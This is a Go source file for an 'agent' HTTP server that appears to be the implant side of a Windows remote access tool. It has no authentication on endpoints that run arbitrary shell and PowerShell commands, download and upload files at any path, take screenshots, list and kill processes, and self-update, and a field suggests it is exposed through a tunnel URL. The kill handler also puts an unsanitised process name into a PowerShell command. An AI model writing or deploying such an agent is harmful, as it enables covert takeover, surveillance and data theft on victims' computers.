package server

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

type AgentStatus int32

const (
	StatusStopped   AgentStatus = 0
	StatusStarting  AgentStatus = 1
	StatusRunning   AgentStatus = 2
	StatusError     AgentStatus = 3
)

func (s AgentStatus) String() string {
	switch s {
	case StatusStopped:
		return "Stopped"
	case StatusStarting:
		return "Starting"
	case StatusRunning:
		return "Running"
	case StatusError:
		return "Error"
	default:
		return "Unknown"
	}
}

type AgentInfo struct {
	ID        string `json:"id"`
	Hostname  string `json:"hostname"`
	PinggyURL string `json:"pinggy_url"`
	Uptime    int64  `json:"uptime"`
	Status    string `json:"status"`
	Tag       string `json:"tag"`
	Version   string `json:"version"`
}

type Server struct {
	mux            *http.ServeMux
	httpSrv        *http.Server
	info           *AgentInfo
	start          time.Time
	status         atomic.Int32
	onStatusChange func(AgentStatus)
	onUpdate       func()
}

func New(tag, version string) *Server {
	hostname, _ := os.Hostname()
	s := &Server{
		start: time.Now(),
		info: &AgentInfo{
			Hostname: hostname,
			Tag:      tag,
			Version:  version,
		},
	}
	s.status.Store(int32(StatusStopped))
	s.mux = http.NewServeMux()
	s.mux.HandleFunc("/", s.handleRoot)
	s.mux.HandleFunc("/api/execute", s.handleExecute)
	s.mux.HandleFunc("/api/ps", s.handlePS)
	s.mux.HandleFunc("/api/status", s.handleStatus)
	s.mux.HandleFunc("/api/info", s.handleInfo)
	s.mux.HandleFunc("/api/download", s.handleDownload)
	s.mux.HandleFunc("/api/upload", s.handleUpload)
	s.mux.HandleFunc("/api/screenshot", s.handleScreenshot)
	s.mux.HandleFunc("/api/files", s.handleFiles)
	s.mux.HandleFunc("/api/processes", s.handleProcesses)
	s.mux.HandleFunc("/api/kill", s.handleKill)
	s.mux.HandleFunc("/api/update", s.handleUpdate)
	return s
}

func (s *Server) SetOnStatusChange(cb func(AgentStatus)) {
	s.onStatusChange = cb
}

func (s *Server) SetOnUpdate(cb func()) {
	s.onUpdate = cb
}

func (s *Server) setStatus(st AgentStatus) {
	s.status.Store(int32(st))
	if s.onStatusChange != nil {
		s.onStatusChange(st)
	}
}

func (s *Server) Status() AgentStatus {
	return AgentStatus(s.status.Load())
}

func (s *Server) Start(addr string) error {
	s.setStatus(StatusStarting)
	s.httpSrv = &http.Server{Addr: addr, Handler: s.mux}
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		log.Printf("net.Listen failed: %v", err)
		s.setStatus(StatusError)
		return err
	}
	log.Printf("net.Listen succeeded on %s", addr)
	err = s.httpSrv.Serve(listener)
	if err != nil && err != http.ErrServerClosed {
		log.Printf("Serve error: %v", err)
		s.setStatus(StatusError)
		return err
	}
	log.Printf("Serve returned (server closed)")
	s.setStatus(StatusStopped)
	return nil
}

func (s *Server) Stop() {
	s.setStatus(StatusStopped)
	if s.httpSrv != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		s.httpSrv.Shutdown(ctx)
	}
}

func (s *Server) SetInfo(id, hostname, pinggyURL string) {
	s.info.ID = id
	s.info.Hostname = hostname
	s.info.PinggyURL = pinggyURL
	s.setStatus(StatusRunning)
}

func (s *Server) SetVersion(v string) {
	s.info.Version = v
}

func (s *Server) handleRoot(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"agent": "v2", "status": s.Status().String()})
}

func (s *Server) handleExecute(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	var req struct {
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, 400, "Invalid JSON")
		return
	}
	result := Execute(req.Command)
	jsonResp(w, 200, result)
}

func (s *Server) handlePS(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	var req struct {
		Command string `json:"command"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, 400, "Invalid JSON")
		return
	}
	result := ExecutePS(req.Command)
	jsonResp(w, 200, result)
}

func (s *Server) handleStatus(w http.ResponseWriter, r *http.Request) {
	jsonResp(w, 200, map[string]interface{}{
		"status": s.Status().String(),
		"uptime": int64(time.Since(s.start).Seconds()),
	})
}

func (s *Server) handleInfo(w http.ResponseWriter, r *http.Request) {
	s.info.Uptime = int64(time.Since(s.start).Seconds())
	s.info.Status = s.Status().String()
	jsonResp(w, 200, s.info)
}

func (s *Server) handleDownload(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	path := r.URL.Query().Get("path")
	if path == "" {
		jsonError(w, 400, "Missing path parameter")
		return
	}
	data, err := os.ReadFile(path)
	if err != nil {
		jsonError(w, 404, fmt.Sprintf("File error: %v", err))
		return
	}
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filepath.Base(path)))
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	w.Write(data)
}

func (s *Server) handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	path := r.URL.Query().Get("path")
	if path == "" {
		jsonError(w, 400, "Missing path parameter")
		return
	}
	data, err := io.ReadAll(r.Body)
	if err != nil {
		jsonError(w, 400, fmt.Sprintf("Read error: %v", err))
		return
	}
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		jsonError(w, 500, fmt.Sprintf("Mkdir error: %v", err))
		return
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		jsonError(w, 500, fmt.Sprintf("Write error: %v", err))
		return
	}
	jsonResp(w, 200, map[string]interface{}{
		"ok":   true,
		"size": len(data),
	})
}

func (s *Server) handleScreenshot(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	data, err := CaptureScreen()
	if err != nil {
		jsonError(w, 500, fmt.Sprintf("Screenshot error: %v", err))
		return
	}
	w.Header().Set("Content-Type", "image/png")
	w.Header().Set("Content-Length", strconv.Itoa(len(data)))
	w.Write(data)
}

func (s *Server) handleFiles(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	dir := r.URL.Query().Get("dir")
	if dir == "" {
		dir = "C:\\"
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		jsonError(w, 500, fmt.Sprintf("ReadDir error: %v", err))
		return
	}
	type Entry struct {
		Name    string `json:"name"`
		IsDir   bool   `json:"is_dir"`
		Size    int64  `json:"size"`
		ModTime string `json:"mod_time"`
	}
	var list []Entry
	for _, e := range entries {
		info, _ := e.Info()
		size := int64(0)
		modTime := ""
		if info != nil {
			size = info.Size()
			modTime = info.ModTime().Format(time.RFC3339)
		}
		list = append(list, Entry{
			Name:    e.Name(),
			IsDir:   e.IsDir(),
			Size:    size,
			ModTime: modTime,
		})
	}
	jsonResp(w, 200, list)
}

func (s *Server) handleProcesses(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	result := ExecutePS(`Get-Process | Select-Object Id, ProcessName, CPU, WorkingSet64, StartTime | ConvertTo-Json -Compress`)
	var data interface{}
	if err := json.Unmarshal([]byte(result.Stdout), &data); err != nil {
		jsonResp(w, 200, result)
		return
	}
	jsonResp(w, 200, data)
}

func (s *Server) handleUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	if s.onUpdate == nil {
		jsonError(w, 500, "No update callback configured")
		return
	}
	jsonResp(w, 202, map[string]string{"status": "update started"})
	go s.onUpdate()
}

func (s *Server) handleKill(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		jsonError(w, 405, "Method not allowed")
		return
	}
	var req struct {
		Pid  int    `json:"pid"`
		Name string `json:"name"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonError(w, 400, "Invalid JSON")
		return
	}
	var cmd string
	if req.Pid > 0 {
		cmd = fmt.Sprintf("Stop-Process -Id %d -Force", req.Pid)
	} else if req.Name != "" {
		cmd = fmt.Sprintf("Stop-Process -Name %s -Force", req.Name)
	} else {
		jsonError(w, 400, "Provide pid or name")
		return
	}
	result := ExecutePS(cmd)
	jsonResp(w, 200, result)
}

func jsonResp(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

func jsonError(w http.ResponseWriter, status int, msg string) {
	jsonResp(w, status, map[string]string{"error": msg})
}

func isWindowsDrive(path string) bool {
	return strings.HasPrefix(strings.ToUpper(path), "C:")
}
